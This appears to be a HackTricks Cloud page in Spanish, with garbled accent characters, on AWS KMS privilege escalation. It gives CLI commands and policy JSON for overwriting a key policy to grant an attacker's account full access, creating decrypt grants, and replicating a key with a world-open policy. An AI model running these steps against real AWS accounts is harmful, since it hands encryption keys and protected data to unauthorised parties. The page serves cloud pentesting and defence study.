# AWS - KMS Privesc

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a **tu empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## KMS

Para obtener m√°s informaci√≥n sobre KMS, consulta:

{% content-ref url="../aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### `kms:ListKeys`,`kms:PutKeyPolicy`, (`kms:ListKeyPolicies`, `kms:GetKeyPolicy`)

Con estos permisos es posible **modificar los permisos de acceso a la clave** para que pueda ser utilizada por otras cuentas o incluso por cualquier persona:

{% code overflow="wrap" %}
```bash
aws kms list-keys
aws kms list-key-policies --key-id <id> # Aunque solo 1 m√°ximo por clave
aws kms get-key-policy --key-id <id> --policy-name <policy_name>
# Las claves de AWS KMS solo pueden tener 1 pol√≠tica, por lo que debes usar el mismo nombre para sobrescribir la pol√≠tica (el nombre suele ser "default")
aws kms put-key-policy --key-id <id> --policy-name <policy_name> --policy file:///tmp/policy.json
```
{% endcode %}

policy.json:

```json
{
    "Version" : "2012-10-17",
    "Id" : "key-consolepolicy-3",
    "Statement" : [ 
        {
            "Sid" : "Enable IAM User Permissions",
            "Effect" : "Allow",
            "Principal" : {
                "AWS" : "arn:aws:iam::<origin_account>:root"
            },
            "Action" : "kms:*",
            "Resource" : "*"
        }, 
        {
            "Sid" : "Allow all use",
            "Effect" : "Allow",
            "Principal" : {
                "AWS" : "arn:aws:iam::<attackers_account>:root"
            },
            "Action" : [ "kms:*" ],
            "Resource" : "*"
        }
    ]
}
```

### `kms:CreateGrant`

Permite a un principal utilizar una clave KMS:

```bash
aws kms create-grant \
    --key-id 1234abcd-12ab-34cd-56ef-1234567890ab \
    --grantee-principal arn:aws:iam::123456789012:user/exampleUser \
    --operations Decrypt
```

{% hint style="warning" %}
Un permiso solo puede permitir ciertos tipos de operaciones: [https://docs.aws.amazon.com/kms/latest/developerguide/grants.html#terms-grant-operations](https://docs.aws.amazon.com/kms/latest/developerguide/grants.html#terms-grant-operations)
{% endhint %}

{% hint style="warning" %}
Ten en cuenta que puede tardar un par de minutos para que KMS **permita al usuario utilizar la clave despu√©s de que se haya generado el permiso**. Una vez que haya pasado ese tiempo, el principal puede utilizar la clave KMS sin necesidad de especificar nada.\
Sin embargo, si es necesario utilizar el permiso de inmediato, [utiliza un token de permiso](https://docs.aws.amazon.com/kms/latest/developerguide/grant-manage.html#using-grant-token) (comprueba el siguiente c√≥digo).\
Para [**m√°s informaci√≥n, lee esto**](https://docs.aws.amazon.com/kms/latest/developerguide/grant-manage.html#using-grant-token).
{% endhint %}

```bash
# Usa el token de permiso en una solicitud
aws kms generate-data-key \
    --key-id 1234abcd-12ab-34cd-56ef-1234567890ab \
    ‚Äì-key-spec AES_256 \
    --grant-tokens $token
```

Ten en cuenta que es posible listar los permisos de las claves con:

```bash
aws kms list-grants --key-id <value>
```

### `kms:CreateKey`, `kms:ReplicateKey`

Con estos permisos es posible replicar una clave KMS habilitada para varias regiones en una regi√≥n diferente con una pol√≠tica diferente.

Por lo tanto, un atacante podr√≠a abusar de esto para obtener privesc en su acceso a la clave y utilizarla.

{% code overflow="wrap" %}
```bash
aws kms replicate-key --key-id mrk-c10357313a644d69b4b28b88523ef20c --replica-region eu-west-3 --bypass-policy-lockout-safety-check --policy file:///tmp/policy.yml

{
    "Version": "2012-10-17",
    "Id": "key-consolepolicy-3",
    "Statement": [
        {
            "Sid": "Enable IAM User Permissions",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "kms:*",
            "Resource": "*"
        }
    ]
}
```
{% endcode %}

### `kms:Decrypt`

Este permiso permite utilizar una clave para descifrar informaci√≥n.\
Para obtener m√°s informaci√≥n, consulta:

{% content-ref url="../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a **tu empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>